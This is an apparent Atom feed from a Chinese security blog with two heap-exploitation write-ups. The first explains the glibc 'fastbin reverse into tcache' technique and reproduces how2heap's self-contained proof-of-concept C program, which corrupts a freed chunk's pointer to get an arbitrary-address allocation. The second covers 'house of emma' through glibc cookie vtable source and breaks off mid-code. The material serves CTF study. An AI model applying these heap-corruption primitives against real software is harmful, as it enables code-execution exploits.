<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2022-05-26T06:09:11.975Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fastbin_reverse_into_tcache</title>
    <link href="https://cv196082.gitee.io/2022/05/26/fastbin-reverse-into-tcache/"/>
    <id>https://cv196082.gitee.io/2022/05/26/fastbin-reverse-into-tcache/</id>
    <published>2022-05-26T05:40:52.000Z</published>
    <updated>2022-05-26T06:09:11.975Z</updated>
    
    <content type="html"><![CDATA[<p>这一利用方式是一种类似于unsorted bin，<a href="https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/">tcache stashing unlink attack</a>可以在任意地址写入堆地址的漏洞。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = victim-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            REMOVE_FB (fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">            <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                       &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = tc_victim-&gt;fd;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在源码中，如果tcache不为空，那么就会从fastbin的fd指针指向的chunk开始往tcache内放入chunk。如果我们能够将最后一个堆地址的fd指针改成我们的目标地址即可实现任意地址写了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的写功能还是在放入tcache的函数内完成的，可以看到其实是写了两个指针的。</p><p><img src="/images/image-20220526135149147.png" alt="image-20220526135149147"></p><p><img src="/images/image-20220526135242008.png" alt="image-20220526135242008"></p><p><img src="/images/image-20220526135305850.png" alt="image-20220526135305850"></p><p>最后实现这样</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里的poc是how2heap当中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在上面poc也说了，如果我们再一次malloc即可获得我们目标地址的chunk，也就是可以进行任意地址分配chunk。</p><hr><p>参考链接：<a class="link"   href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c" >https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一利用方式是一种类似于unsorted bin，&lt;a href=&quot;https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/&quot;&gt;tcache stashing unlink attack&lt;/a&gt;可</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>house of emma</title>
    <link href="https://cv196082.gitee.io/2022/05/17/house-of-emma/"/>
    <id>https://cv196082.gitee.io/2022/05/17/house-of-emma/</id>
    <published>2022-05-17T07:46:12.000Z</published>
    <updated>2022-05-17T07:54:14.415Z</updated>
    
    <content type="html"><![CDATA[<p>在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识<a href="https://cv196082.gitee.io/2022/02/23/largebin-attack/">largebin attack</a>和<a href="https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/">house of kiwi</a>在这里就不再提了。然后后面一篇文章上次好像提了是写how2heap在glibc2.31之后的变化总结，不过会新加一个利用方式也是我今天才知道的Fastbin Reverse Into Tcache(先给自己挖个坑)</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>为什么说house of emma的前置知识需要house of kiwi是因为其退出的方式是_exit(0)所以没有办法使用以往的fsop的方式来进行，调用的链子还是使用assert来触发。他们之间的不同点就是这里利用的vtable不一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里使用的是上面的这个vtable，其中的几个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="keyword">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是直接调用指针当作函数来调用，也就存在了一定的安全隐患了。</p><p><img src="/images/image-20220517140003113.png" alt="image-20220517140003113"></p><p>这里查看汇编代码可以看到是将取出来的值首先循环右移了0x11接着与fs:0x30进行异或之后检验rax是否为空，最后再调用rax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> 